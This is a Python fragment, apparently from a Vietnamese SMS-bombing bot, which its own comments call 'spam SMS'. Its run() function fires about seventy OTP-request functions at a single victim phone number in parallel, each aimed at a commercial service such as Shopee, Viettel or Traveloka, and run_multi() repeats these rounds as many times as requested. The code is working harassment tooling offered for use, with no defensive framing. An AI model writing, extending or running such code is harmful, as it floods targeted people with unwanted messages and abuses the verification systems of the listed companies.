def run(phone, round_num=1):
    """Chạy spam SMS 1 lần (bot gọi)"""
    functions = [
        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
        send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
        send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
        send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
        send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
        send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
        send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
        send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
        send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
        send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
        send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
        send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
        send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Lỗi: {exc}')

    print(f"✅ Spam xong lần {round_num}")
    for j in range(3, 0, -1):
        time.sleep(1)


def run_multi(phone, count):
    """Chạy spam nhiều lần (bot gọi hàm này)"""
    for i in range(1, count + 1):
        run(phone, i)